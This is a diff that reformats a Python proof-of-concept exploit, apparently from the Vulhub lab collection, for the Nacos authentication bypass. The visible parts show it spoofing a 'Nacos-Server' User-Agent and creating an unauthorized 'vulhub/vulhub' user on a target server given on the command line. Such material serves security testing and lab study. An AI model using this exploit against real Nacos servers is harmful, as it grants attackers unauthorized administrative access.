@@ -1,12 +1,9 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
 import sys
 
 import requests
 
-headers = {
-    "User-Agent": "Nacos-Server"
-}
+headers = {"User-Agent": "Nacos-Server"}
 
 
 def check(target):
@@ -26,13 +23,13 @@ def add_user(target):
     if r.status_code == 200 and "create user ok" in r.text:
         print("Add User Success")
         print("New User Info: vulhub/vulhub")
-        print("Nacos Login Endpoint: {}/nacos/".format(target))
+        print(f"Nacos Login Endpoint: {target}/nacos/")
         exit(1)
 
     print("Add User Failed")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     if len(sys.argv) != 2:
         print("Please specify the target: python poc.py http://xxxxx:8848")
         exit(-1)
